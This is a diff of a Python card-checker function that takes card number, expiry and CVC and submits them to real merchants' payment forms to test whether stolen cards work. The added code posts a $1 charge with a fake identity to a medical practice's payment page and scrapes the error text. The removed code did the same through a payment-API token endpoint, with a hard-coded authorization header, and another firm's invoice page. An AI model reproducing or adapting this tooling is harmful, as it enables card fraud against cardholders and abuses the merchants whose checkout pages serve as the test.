@@ -6,77 +6,54 @@ def Tele(ccx):
 	mm = ccx.split("|")[1]
 	yy = ccx.split("|")[2]
 	cvc = ccx.split("|")[3]
+	if str(n).startswith("5"):
+		type = "M"
+	if str(n).startswith("4"):
+		type = "V"
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
-	if "01" in mm or "02" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
-		mm = mm.split("0")[1]
 	r = requests.session()
 	
-	random_amount1 = random.randint(1, 9)
-	random_amount2 = random.randint(1, 99)
-	
 	headers = {
-	    'authority': 'api.payway.com.au',
-	    'accept': 'application/json',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'authorization': 'Basic UTE4Mzc1X1BVQl8yc3VxNmt4M3pha2JtdTR6dWQ0eDVhM2ZyZG14eXpxOGlpbnoydjZ4emN5cGs1MnR6YWFzN2dwbWp6ZWk6',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://api.payway.com.au',
-	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
+	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Cache-Control': 'max-age=0',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/x-www-form-urlencoded',
+	    'Origin': 'https://jonnaschmidtmd.com',
+	    'Referer': 'https://jonnaschmidtmd.com/make-an-online-payment/',
+	    'Sec-Fetch-Dest': 'document',
+	    'Sec-Fetch-Mode': 'navigate',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'Sec-Fetch-User': '?1',
+	    'Upgrade-Insecure-Requests': '1',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'x-no-authenticate-basic': 'true',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
 	data = {
-	    'paymentMethod': 'creditCard',
-	    'connectionType': 'FRAME',
-	    'cardNumber': f'{n}',
-	    'cvn': f'{cvc}',
-	    'cardholderName': 'Gen Paypal',
-	    'expiryDateMonth': f'{mm}',
-	    'expiryDateYear': f'{yy}',
-	    'threeDS2': 'false',
+	    'process': 'yes',
+	    'amount': '1',
+	    'item_description': 'General',
+	    'fname': 'Gen',
+	    'lname': 'Paypal',
+	    'address': '27 Allen St',
+	    'city': 'New York',
+	    'country': 'US',
+	    'state': 'NY',
+	    'zip': '10080',
+	    'email': 'genpaypal01@gmail.com',
+	    'cctype': f'{type}',
+	    'ccn': f'{n}',
+	    'ccname': 'Gen Paypal',
+	    'exp1': f'{mm}',
+	    'exp2': f'20{yy}',
+	    'cvv': f'{cvc}',
 	}
 	
-	response = requests.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
+	response = requests.post('https://jonnaschmidtmd.com/make-an-online-payment/', headers=headers, data=data)
 	
-	tok = response.json()['singleUseTokenId']
-	
-	headers = {
-	    'authority': 'www.coriowm.com.au',
-	    'accept': '*/*',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://www.coriowm.com.au',
-	    'referer': 'https://www.coriowm.com.au/pay-an-invoice/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
-	}
-	
-	data = {
-	    'action': 'payway_process_payment',
-	    'nonce': '10aa142205',
-	    'amount': f'{random_amount1}.{random_amount2}',
-	    'description': 'TEST',
-	    'customer_number': '1',
-	    'order_number': '1',
-	    'card_token': f'{tok}',
-	}
-	
-	response = requests.post('https://www.coriowm.com.au/wp-admin/admin-ajax.php', headers=headers, data=data)
-	
-	result = response.json()['message']
+	result = re.search(r'class="anpt_message anpt_error_message"><div>(.*?)</div></div>', response.text).group(1)
 	return result
